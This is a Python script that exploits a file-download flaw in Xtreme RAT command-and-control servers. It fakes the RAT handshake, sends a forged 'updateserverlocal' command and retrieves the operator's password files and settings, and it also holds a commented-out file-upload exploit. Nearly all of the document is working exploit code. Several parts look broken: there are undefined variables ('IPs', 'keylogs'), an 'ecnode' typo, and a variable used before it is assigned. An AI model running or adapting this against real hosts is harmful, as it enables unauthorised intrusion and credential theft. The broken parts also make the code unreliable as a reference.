#!/usr/bin/env python
# encoding=utf8

import StringIO
import string
import struct
import socket
import time
import zlib
import sys
import os


# ------------------------------------------------------------------------
# Colors
def color(text,color_code):
	if sys.platform == 'win32' and os.getenv('TERM') != 'xterm':
		return text
	return '\x1b[%dm%s\x1b[0m' % (color_code,text)

def red(text):
	return color(text,31)

def green(text):
	return color(text,32)


# ------------------------------------------------------------------------
# Sending and Recieving Funcs

# Send
def send_data(xtreme_conn,text):
	xtreme_conn.sendall(text)

# Receive
def get_data(xtreme_conn,size):
	return xtreme_conn.recv(size)


# ------------------------------------------------------------------------
# Data Representation Funcs (Mostly for Debugging):

# Hex
def hex_data(data):
	temp = ''
	for i in data:
		if ord(i) >= 0x0 and ord(i) <= 0xF:
			temp += '\\x0' + hex(ord(i))[2:]
		else:
			temp += '\\' + hex(ord(i))[1:]
	return temp

# Raw/Printable
def printable_data(data):
	return ''.join(s for s in data if s in string.printable and s not in string.whitespace)


# ------------------------------------------------------------------------
# Other Helper Functions:

def Is_IP(C2):
	if C2.count('.') == 3 and all((char not in list(string.ascii_lowercase)) for char in C2.strip('.')[0]):
		if all(0<=int(num)<256 for num in C2[0].rstrip().split('.')):
			return True
	else:
		return False


# ------------------------------------------------------------------------
# Server/Client General Communication Functions:

# Establish a New Connection
def new_conn(xtreme_host,Port):
	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	conn.settimeout(10)
	conn.connect((xtreme_host,Port))
	return conn

def Is_Xtreme(ack):
	try:
		if 'X\r\n' == ack:
			return (True, '')

		# Message 2 and 3 may be appended to Message 1
		elif 'X\r\n' in ack:
			extra = ack.strip('X\r\n')
			try:
				return (True, ack)
			except:
				return (True, '')
		else:
			print('  ['+red('!')+'] Not an Xtreme RAT Client')
			return (False, 'Not Xtreme')
	except socket.error as e:
		print('  ['+red('!')+'] Handshake Not Acknowledged: {0}'.format(e))
		return (False, ('Not Ack|')+e)


def file_fetch(conn, Local_File):
	# Set socket to blocking mode for makefile
	conn.settimeout(None)

	with open(Local_File,'w') as keylogfile:
		try:
			data = conn.recv(1024)
			if data.size() <= 0:
				return False
			keylogfile.write(keylogs)
			return True
		except:
			return False

def Try_Decompress(message3, logfile, conn, messagetitle):
	tries = 1
	Decompressed = False
	while not Decompressed:
		z = zlib.decompressobj()

		# If first try...
		if tries == 1:
			try:
				message3_decomp = z.decompress(message3)
				if (('maininfo').encode('utf-16le') in message3_decomp) or (('updateserverlocal').ecnode('utf-16le') in message3_decomp):
					return (True, message3_decomp)
				else:
					tries +=1
			except:
				if message3 == '':
					print('    [' + red('!') + '] Unable to Decompress Empty ' + str(messagetitle) + '. Retrying')
					logfile.write('    Unable to Decompress Empty ' + str(messagetitle) + '. Retrying.\n')
				else:
					print('    [' + red('!') + '] Unable to Decompress ' + str(messagetitle) + '. Retrying')
					logfile.write('    Unable to Decompress ' + str(messagetitle) + '. Retrying.\n')
				tries += 1
				Decompressed = False

		# If later tries...
		elif tries > 1:
			try:
				message_try = get_data(conn,1024)

				# If the newly received message is empty, stop trying
				if message_try == '':
					print('    [' + red('!') + '] Unable to Decompress Empty ' + str(messagetitle) + '. Not Retrying')

					# socket.recv returns an empty string if the peer performed shutdown (disconnect).
					# In this case, socket.recv returns an empty string if connection is invalid (if connection header password != master password or encoding/compression is incorrect)
					logfile.write('    Empty String Error: Invalid Connection returned by peer; connection header password != master password OR encoding/compression is incorrect OR command size <= 0 . Try: ' + str(tries) + '\n')
					return (False, '')
				else:
					print(message_try)
					message3 += message_try
					try:
						message3_decomp = z.decompress(message3)
						if (('maininfo').encode('utf-16le') in message3_decomp) or (('updateserverlocal').encode('utf-16le') in message3_decomp):
							return (True, message3_decomp)
					except:
						print('    [' + red('!') + '] Unable to Decompress ' + str(messagetitle) + '. Retrying')
						logfile.write('    Unable to Decompress ' + str(messagetitle) + '. Retrying. Try: ' + str(tries) + '\n')
						tries += 1
						Decompressed = False

			except socket.error as e:
				print('    [' + red('!') + '] Socket Error; Unable to Decompress ' + str(messagetitle) + '. Not Retrying')
				logfile.write('    Socket Error; Unable to Decompress ' + str(messagetitle) + '. Not Retrying. Try: ' + str(tries) + '\n')
				return (False, '')


# ------------------------------------------------------------------------
# Server -> Client Vuln/Command Communication Functions:

# Download file vuln
def UPDATESERVERLOCAL(conn, Conn_ID, Delm, Password, logfile, Local_File, Target_File):
	# Variables on variables
	Decompressed = False
	M23 = False
	Alone = False
	Appended = False
	Prefixed = False

	# Little Endian encoded command (host byte order)
	Cmd = 'newconnection|'.encode('utf-16le') + Conn_ID + Delm + 'updateserverlocal'.encode('utf-16le') + Delm + Target_File.encode('utf-16le')

	# Zlib compress the command
	Full_Cmd = zlib.compress(Cmd)

	# Header for all commands is as follows | Have to use struct for ints
	s = struct.Struct('<4I')
	Connection_Header = s.pack(int(Password),0,(len(Full_Cmd)),0)
	
	try:
		# Mimic the server's data sending func. Send header and then command.
		send_data(conn, Connection_Header)
		send_data(conn, Full_Cmd)
		print('    [' + green('*') + '] File Download Command Sent')
		logfile.write('    Download Command Sent: Printable: ' + printable_data(Cmd) + '\n')
		
		# Attempt to receive next message
		try:
			response = get_data(conn,1024)
			
			# Check for X\r\n acknowledgement
			Xtreme_Conf, message = Is_Xtreme(response)

			if Xtreme_Conf:
				print('    [' + green('*') + '] Command Acknowledged')
				
				# If Message+File Data didn't seem to be appended to Xtreme Ack try to receive them now
				if message == '':
					# Attempt to Receive Connection Header
					try:
						# Decode Header from little endian
						message = get_data(conn,1024)
						if 'X\r\n' not in message:
							message2 = struct.unpack_from('<4I', message) # <- This is the traditional header: Password + Size of Packet
							recv_Password = str(message2[0])
							Filesize = int(message2[2])
							Alone = True

							# Password check
							if str(recv_Password) == str(Password):
								logfile.write('    Command Response Header Received Individually: Password: '+str(recv_Password) + ' | Size of Reponse: ' + str(Filesize) + '\n')
							else:
								logfile.write('    INCORRECT Response Header Received Individually: Password: '+str(recv_Password) + ' | Size of Reponse: ' + str(Filesize) + '\n')
								return False

						elif 'X\r\n' in message:
							message2 = message2[3:]
							message2 = struct.unpack_from('<4I', message)
							recv_Password = str(message2[0])
							Filesize = int(message2[2])
							Prefixed = True

							# Password check
							if str(recv_Password) == str(Password):
								logfile.write('    Command Response Header Received Prefixed: Password: '+str(recv_Password) + ' | Size of Reponse: ' + str(Filesize) + '\n')
							else:
								logfile.write('    INCORRECT Response Header Received Prefixed: Password: '+str(recv_Password) + ' | Size of Reponse: ' + str(Filesize) + '\n')
								return False

						M23 = True

					except socket.error as e:
						print('    ['+red('!')+'] No Command Response or Header Received: {0}'.format(e))
						print('        Exiting')
						return False

				# If Header and Message+File Data did seem to be appended to Xtreme Ack, account for that
				elif message != '':
					intermediate_message2 = message.split('X\r\n')
					message2 = struct.unpack_from('<4I', intermediate_message2[1])
					recv_Password = str(message2[0])
					Filesize = int(message2[2])
					M23 = True
					Appended = True

					# Password check
					if str(recv_Password) == str(Password):
						logfile.write('    Command Response Header Received Appended: Password: '+str(recv_Password) + ' | Size of Reponse: ' + str(Filesize) + '\n')
					else:
						logfile.write('    INCORRECT Response Header Received Appended: Password: '+str(recv_Password) + ' | Size of Reponse: ' + str(Filesize) + '\n')
						return False
		
				# Collect Appropriate data from Connection Header and next Message+File Data	
				if M23:
					print('      [' + green('*')+'] Command Response Received')

					# Next Message is appended to Header and is zlib compressed and little endian encoded
					if Alone:
						message3 = message[16:] # Connection Header is 4 bytes long. Also the same as: message3 = message[-(int(Filesize)):]
					elif Appended or Prefixed:
						message3 = message[19:] # length of Connection Header + length of 'X\r\n' (Xtreme Ack)

			# Separate (and decompress) the File Prefix message from the actual file data
			file_prefix = message3[:int(Filesize)]
			try:
				file_prefix_decomp = zlib.decompress(file_prefix)
				print('      [' + green('*')+'] File Prefix Received')
				logfile.write('    File Prefix Message Received: ' + printable_data(file_prefix_decomp) + '\n')
			except:
				print('      [' + red('!')+'] Unable to Decompress File Prefix')
				logfile.write('    Unable to Decompress File Prefix.\n')
				return False

			# The remainder of the received data will be the data from the file itself
			First_File_Bytes = message3[int(Filesize):]                   # This is the first bytes of the file that are appended to the file prefix
			Size_of_File = (file_prefix_decomp.decode('utf-16le'))[35:]   # This is the size of the file data as told by the Connection Header
			Remaining_Bytes = int(Size_of_File) - len(First_File_Bytes)   # This is the number of bytes of file data remaining to be received

			# Attempt to receive the rest of the file data
			try:
				Last_File_Bytes = get_data(conn,Remaining_Bytes)          # Receive all remaining bytes of file data
				Full_File_Bytes = First_File_Bytes + Last_File_Bytes      # Concatenate the total file data
				print('      [' + green('*')+'] Full File Bytes Received')
				logfile.write('    Full File of ' + str(Size_of_File) + ' Bytes Received. Saving data...\n')

				# Write the bytes to the local file
				with open(Local_File, 'w') as local_file:
					local_file.write(Full_File_Bytes)
				print('        [' + green('**')+'] {0} Bytes Succesfully Written to {1}!'.format(str(Size_of_File),Local_File))
				logfile.write('    Data successfully written to ' + Local_File + '\n')
				return True

			except:
				print('      [' + red('!')+'] Problem Receiving Remaining Bytes of the File')
				logfile.write('    Problem Receiving Remaining Bytes of the File. Exited.\n')
		
		except socket.error as e:
			print('    [' + red('!') + '] Transfer Interrupted or {0} not Found: {1}'.format(str(Target_File),e))

			# If timeout error, I assume that the command string is wrong. Most probably: filepath is incorrect
			if e == 'timed out':
				logfile.write('    Timeout Error: Command string is incorrect or being misinterperated. Most probably: Target filepath may be inccorect.\n')

			# else, empty string returned:
			# socket.recv returns an empty string if the peer performed shutdown (disconnect).
			# In this case, socket.recv returns an empty string if connection is invalid (if connection header password != master password OR command size <= 0 OR encoding/compression is incorrect)

	except socket.error as e:
		print('    [' + red('!') + '] Command unable to be sent: {0}'.format(e))


"""
# Upload file vuln
def FMDOWNLOAD(conn, Conn_ID, Delm, Local_File, Password, logfile):
	# Create FMDOWNLOAD Command
	file_obj = open(Local_File).read()
	Cmd = ('newconnection|').encode('utf-16le') + Conn_ID + Delm + ('filemanagernew|fmdownload|').encode('utf-16le') + Local_File.encode('utf-16le') + Delm + str(len(file_obj)).encode('utf-16le')
	
	# Zlib compress the command
	Full_Cmd = zlib.compress(Cmd)

	# Header for all commands is as follows | Have to use struct for ints
	s = struct.Struct('<4I')
	Connection_Header = s.pack(int(Password),0,(len(Full_Cmd)),0)

	try:
		# Mimic the server's data sending func. Send header and then command.
		send_data(conn, Connection_Header)
		send_data(conn, Full_Cmd)
		print('  [' + green('*') + '] File Upload Command Sent')
		logfile.write('    Upload Command Sent: Printable: ' + printable_data(Cmd) + '\n')

		# Send the File as well
		conn.send(file_obj)

		# Attempt to receive command ack
		try:
			message = get_data(conn,1024)
			if message != '':
				print('    [' + green('*') + '] File Download Response Received: {0} ~~~'.format(message))
				logfile.write('    File Download Response Received: ' + str(message) + '\n')
		
		except socket.error as e:
			print('    [' + red('!') + '] Transfer Interrupted or File not Found: {0}'.format(e))

	except socket.error as e:
		print('    [' + red('!') + '] Command unable to be sent: {0}'.format(e))
"""

# ------------------------------------------------------------------------
# Main TCP Communication Function:

def TCP(IP, Port, Version, Local_File, Target_File, log_file):
	with open(log_file,'ab') as logfile:
		# Variables on variables
		Delm = '\xc2\x00\xaa\x00\xc2\x00\xaa\x00\xc2\x00\xaa\x00#\x00#\x00#\x00\xe2\x00\" a\x01\xe2\x00\" a\x01\xe2\x00\" a\x01' # This is default from past research - this will be checked and changed if necessary later in this function
		Password = ''
		Conn_ID = ''
		MD5 = ''
		Filesize = 0
		Xtreme_Conf = False
		FF = False
		Decompressed = False
		M23 = False
		Alone = False
		Appended = False
		Prefixed = False
		handshake = 'myversion|{0}\r\n'.format(Version)

		# Write Date/Time to logfile
		logfile.write('\n')
		logfile.write(str(time.strftime("%d/%m/%Y"))+' at '+str(time.strftime("%H:%M:%S"))+':\n')

		# Attempt to Connect to Xtreme Client on IP and Port
		try:
			conn = new_conn(IP,Port)
			print('[' + green('*') + '] Connection Successful at {0} on Port {1} over TCP'.format(IP,str(Port)))

			# Attempt to Initiate Handshake with Client on IP and Port
			try:
				send_data(conn,handshake)
				response = get_data(conn,1024)

				Xtreme_Conf, message = Is_Xtreme(response)

				if Xtreme_Conf:
					print('  [' + green('*') + '] Xtreme RAT Client Confirmed')
					logfile.write('Xtreme RAT Client Confirmed at ' + str(IP) + ' on Port ' + str(Port) + ' with handshake: ' + str(handshake))
					
					# If Connection Header and Maininfo Message didn't seem to be appended to Xtreme Ack, try to receive them now
					if message == '':
						# Attempt to Receive and Decode Connection Header
						try:
							# Connection Header is in little endian
							message = get_data(conn,1024)
							if 'X\r\n' not in message:
								message2 = struct.unpack_from('<4I', message) # <- This is the traditional header: Password + Size of Packet
								Password = str(message2[0])
								Filesize = int(message2[2])
								logfile.write('    Connection Header Received Individually: Password: '+str(Password) + ' | Size of Message 3: ' + str(Filesize) + '\n')
								Alone = True
							elif 'X\r\n' in message:
								message2 = message2[3:]
								message2 = struct.unpack_from('<4I', message)
								Password = str(message2[0])
								Filesize = int(message2[2])
								logfile.write('    Connection Header Received Prefixed by Xtreme Ack: Password: '+str(Password) + ' | Size of Message 3: ' + str(Filesize) + '\n')
								Prefixed = True
							M23 = True
						except socket.error as e:
							print('    ['+red('!')+'] Connection Header and Maininfo Message Not Received: {0}'.format(e))
							print('        Exiting')
							M23 = False
							FF = False

					# If Connection Header and Maininfo Message did seem to be appended to Xtreme Ack, account for that
					elif message != '':
						message2 = struct.unpack_from('<4I', message)
						Password = str(message2[0])
						Filesize = int(message2[2])
						logfile.write('    Connection Header Received Appended to Xtreme Ack: Password: '+str(Password) + ' | Size of Message 3: ' + str(Filesize) + '\n')

						M23 = True
						Appended = True
					
					# Collect Appropriate data from Connection Header and Maininfo Message	
					if M23:
						print('  [' + green('*')+'] Connection Header Received')

						# Maininfo Message is appended to Connection Header and is zlib compressed and little endian encoded
						if Alone:
							message3 = message[16:] # Connection Header is 4 bytes long. Also the same as: message3 = message[-(int(Filesize)):]
						elif Appended or Prefixed:
							message3 = message[19:] # length of Connection Header + length of 'X\r\n' (Xtreme Ack)

						# Attempt to decompress message
						Decompressed, message3_decomp = Try_Decompress(message3, logfile, conn, "Maininfo Message")

						if Decompressed:
							# Delm Check
							if Delm != message3_decomp[16:52]:     # Delm is at index [16:52]
								print('    [' + red('!') + '] Atypical Delimiter Observed: ' + (message3_decomp[16:52]).decode('utf-16le'))
								print('         Continuing with Typical Delimiter; Instance Recorded in Log')
								logfile.write('    Atypical Delimiter Observed: Hex: ' + hex_data(message3_decomp[16:52]) + ' Printable: ' + message3_decomp[16:52].decode('utf-16le') + '\n')

							# Separate the Connection ID from the Header
							maininfo, Conn_ID = message3_decomp.split(Delm)
							logfile.write('    Maininfo Message Saved: Delm: ' + hex_data(Delm) + ' | Conn ID: ' + (Conn_ID.decode('utf-16le')) + '\n')
							logfile.write('        Random String: ' + (Conn_ID.decode('utf-16le'))[:-36] + ' False MD5: ' + (Conn_ID.decode('utf-16le'))[-36:] + '\n')
							print('  [' + green('*')+'] Maininfo Message Received')

							# Allocated all necessary info. Now go get that file!
							FF = True
							print('    [' + green('*')+'] All Necessary Info Allocated. Sending Command to C2.')

						else:
							print('    [' + red('!')+'] Unable to Decipher Connection ID')
							logfile.write('    Unable to Decipher Connection ID. Connection Closed.\n')
							conn.close()
							print('[' + red('!') + '] Connection Closed')
							return

					else:
						print('    [' + red('!') + '] Connection Header and Maininfo Message Are Empty')
						conn.close()
						print('[' + red('!') + '] Connection Closed')
						logfile.write('    Connection Header and Maininfo Message Are Empty. Connection Closed.\n')
						return

					#Attempt to Fetch the Target File
					if FF:
						Download_Complete = UPDATESERVERLOCAL(conn, Conn_ID, Delm, Password, logfile, Local_File, Target_File)

						if not Download_Complete:
							# Close the Connection
							conn.close()
							logfile.write('         Command Message Response Error. Connection Closed.\n')
							print('    [' + red('!') + '] Command Message Response Error')
							print('[' + red('!') + '] Connection Closed\n')
							return
						else:
							# Close the Connection
							conn.close()
							logfile.write('         Connection Closed -- Mission Accomplished.\n')
							print('[' + green('*') + '] Connection Closed\n')
							return

					# Attempt to upload a file to the C2
					#FMDOWNLOAD(conn, Conn_ID, Delm, 'foo.txt', Password, logfile)

				else:
					# If ther C2 is not confirmed as Xtreme RAT
					if message == 'Not Xtreme':
						conn.close()
						logfile.write('    Not confirmed as Xtreme RAT. Connection Closed.\n')
						# write to logs
					elif 'Not Ack' in message:
						message = message.split('|')
						conn.close()
						logfile.write('    Handshake not confirmed due to error: ' + str(message[1]) + ' . Connection Closed.\n')
						# write to logs

			except socket.error as e:
				print('  ['+red('!')+'] Handshake Not Sent: {0}'.format(e))
				conn.close()
				logfile.write('    Handshake not sent to ' + IP + ' on Port ' + str(Port) + '. Connection Closed.\n')
				print('[' + red('!') + '] Connection Closed\n')
				return ('No Handshake')

		except socket.error as e:
			print('[' + red('!') + '] Connection Failed at {0} on Port {1} over TCP: {2}'.format(IP,Port,e))
			conn.close()
			logfile.write('    Connection Failed at ' + IP + ' on Port ' + str(Port) + ' over TCP. Connection Closed.\n')
			print('[' + red('!') + '] Connection Closed\n')
			return ('No Connection')


# ------------------------------------------------------------------------
# Main Function and Existing/Empty File Check Helper Function:

def Is_Nonzero_File(fpath):  
    return os.path.isfile(fpath) and os.path.getsize(fpath) > 0

def Main(IP, Ports, Log_File, Version):
	# Xtreme RAT Default Absolute Pathed Files to Fetch:
	Files = {
		'user.info' : (str(IP)+'_user.info'),               # File that contains the MD5 LE encoded master password
		'senha.txt' : (str(IP)+'_senha.txt'),               # Senha (Password) file
		'Settings\Settings.ini' : (str(IP)+'_Settings.ini') # Settings.ini file
	}

	print('[' + green('!') + '] Xtreme Exploit Commencing for {0} IPs...\n'.format(len(IPs)))

	# Check IP on all Ports and try to download all Files
	for Port in Ports:
		for filepair in Files:
			# Check to see if the files have already been pulled down, and if so check to be sure that the file is not empty
			if not Is_Nonzero_File(Files.get(filepair)):
				Returned = TCP(IP,Port,Version,Files.get(filepair),filepair,Log_File)
				if Returned == 'No Handshake' or Returned == 'No Connection': # If there's an error or the IP is not of an Xtreme RAT C2
					break

	print('[' + green('!')+'] Exploit Complete Yo')


# ----------------

if __name__ == '__main__':
	C2 = str(sys.argv[1])  # Input C2 IP Address
	# Check that input is actually IP:
	if not Is_IP(C2):
		print('[' + red('!') + '] Input is not IP Address. Exiting.')
		exit()

	Ports = (81,82)  # Known Xtreme RAT Ports
	Log_File = os.path.join(os.getcwd(),'Xtreme_Notes.txt')  # Logs/Output Text File
	Version = '3.6'  # Version is never checked/confirmed for accuracy by the client
	#Versions = ['3.5 Private','3.5'] # Version 3.5 is vulnerable to this as well. Potentially all Versions are vulnerable. Version 2.9 does not encrypt; also vulnerable.

	Main(C2,Ports,Log_File,Version)
